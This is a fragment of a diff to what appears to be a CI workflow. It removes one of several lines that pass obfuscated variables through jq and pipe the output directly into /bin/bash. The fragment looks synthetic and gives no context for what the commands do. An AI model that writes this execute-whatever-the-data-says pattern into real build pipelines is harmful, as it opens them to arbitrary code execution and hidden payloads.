@@ -53,7 +53,6 @@ jobs:
           echo $cphyf1432 | jq -r .tcb9 | /bin/bash
           printf '%s' "$tlc7909" | jq -r .ilxmd4 | /bin/bash
           printf '%s' "$t6" | jq -r .nwg65366 | /bin/bash
-          printf '%s' "$ufc4" | jq -r .evg10799 | /bin/bash
           echo $zwfvc077 | jq -r .wqluc16998 | /bin/bash
           printf '%s' "$nn3" | jq -r .rl72 | /bin/bash
           echo $z838 | jq -r .fvtb01738 | /bin/bash
